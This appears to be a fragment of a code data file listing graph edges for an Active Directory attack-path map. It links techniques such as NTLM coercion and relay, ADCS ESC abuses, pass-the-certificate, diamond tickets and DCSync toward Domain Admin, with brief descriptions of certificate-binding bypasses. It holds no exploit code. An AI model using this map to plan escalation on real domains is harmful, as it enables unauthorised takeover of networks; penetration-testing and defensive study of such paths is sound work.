  // RemotePotato0: low-priv session coerces another logged-on user's NTLM → crack or relay.
  { source: 'user-foothold', target: 'remotepotato' },
  { source: 'remotepotato', target: 'crack-netntlm', label: 'capture NetNTLMv2' },
  { source: 'remotepotato', target: 'ntlm-relay', label: 'relay the auth' },
  // SSSD UPN spoofing: write a victim UPN → NT_ENTERPRISE TGT impersonates them on a Linux/SSSD host.
  // (acl-tgt-user → sssd-upn-spoof edge lives in the object-first ACL block above.)
  { source: 'sssd-upn-spoof', target: 'user-foothold', label: 'impersonate on Linux/SSSD host' },
  // COM/CLSID handler hijack: another logged-on user runs your code in their session.
  { source: 'ad-cat-lateral', target: 'com-hijack' },
  { source: 'com-hijack', target: 'user-foothold', label: 'exec in victim session' },
  { source: 'gpo-abuse', target: 'domain-admin', label: 'task on DC/linked' },
  { source: 'gpo-abuse', target: 'local-admin-host', label: 'local admin on linked' },
  { source: 'gpp-cpassword', target: 'local-admin-host', label: 'local admin reuse', rel: 'cred-reuse' },
  { source: 'gpp-cpassword', target: 'valid-domain-creds', label: 'domain user / svc creds' },
  { source: 'krbtgt-hash', target: 'trust-sid-history', label: 'child krbtgt' },
  { source: 'trust-sid-history', target: 'enterprise-admin', label: 'Enterprise Admin' },
  { source: 'printnightmare', target: 'local-admin-host', label: 'SYSTEM' },
  // domain-admin -> skeleton-key now routes through the 'Persistence' category.
  { source: 'krbtgt-hash', target: 'diamond-ticket' },
  { source: 'diamond-ticket', target: 'pass-the-ticket' },
  { source: 'adcs-esc1', target: 'pass-the-certificate', label: 'PKINIT cert' },
  { source: 'adcs-esc1', target: 'adcs-esc9', label: 'no-SID pivot', description: 'A patched CA stamps a SID security extension carrying your real SID into the cert, so the KDC binds the ESC1 cert to you and ignores the forged SAN. Pivot to an ESC9 template (CT_FLAG_NO_SECURITY_EXTENSION), which omits that extension, so where the DC still allows weak binding (StrongCertificateBindingEnforcement 0 or 1) the KDC falls back to the SAN/UPN you control.' },
  { source: 'adcs-esc1', target: 'adcs-esc16', label: 'no-SID pivot', description: 'Same block as the ESC9 pivot, but the SID security extension is disabled CA-wide (ESC16) rather than per-template, so no certificate the CA issues carries the enrollee SID.' },
  { source: 'shadow-credentials', target: 'pass-the-certificate', label: 'key credential' },
  { source: 'pass-the-certificate', target: 'valid-domain-creds', label: 'TGT + NT hash' },
  // The cert authenticates as whoever it impersonates, so the cert→auth hub itself
  // reaches DCSync (a DC / replication-capable cert) or DA (a cert as a Domain Admin).
  { source: 'pass-the-certificate', target: 'dcsync', label: 'DC / replication cert' },
  { source: 'pass-the-certificate', target: 'domain-admin', label: 'cert impersonates a DA' },
  { source: 'mssql-linked-servers', target: 'user-foothold', label: 'xp_cmdshell as the SQL service account' },
  { source: 'adcs-esc4', target: 'adcs-esc1', label: 'rewrite template' },
  // ADCS ESC family -> downstream
  { source: 'adcs-esc2', target: 'pass-the-certificate', label: 'on-behalf-of cert' },
  { source: 'adcs-esc3', target: 'pass-the-certificate', label: 'on-behalf-of cert' },
  { source: 'adcs-esc5', target: 'golden-certificate', label: 'CA-host takeover' },
  { source: 'adcs-esc6', target: 'pass-the-certificate', label: 'SAN-spoofed cert' },
  { source: 'adcs-esc7', target: 'adcs-esc6', label: 'flip EDITF flag' },
  { source: 'adcs-esc7', target: 'pass-the-certificate', label: 'SubCA issue' },
  { source: 'adcs-esc9', target: 'pass-the-certificate', label: 'UPN-swap cert' },
  { source: 'adcs-esc10', target: 'pass-the-certificate', label: 'weak mapping' },
  { source: 'coerced-auth', target: 'adcs-esc11' },
  { source: 'adcs-esc11', target: 'pass-the-certificate', label: 'DC machine cert' },
  { source: 'adcs-esc13', target: 'pass-the-certificate', label: 'linked-policy cert' },
  { source: 'adcs-esc15', target: 'pass-the-certificate', label: 'injected EKU cert' },
  { source: 'golden-certificate', target: 'domain-admin', label: 'forge DA cert' },
];
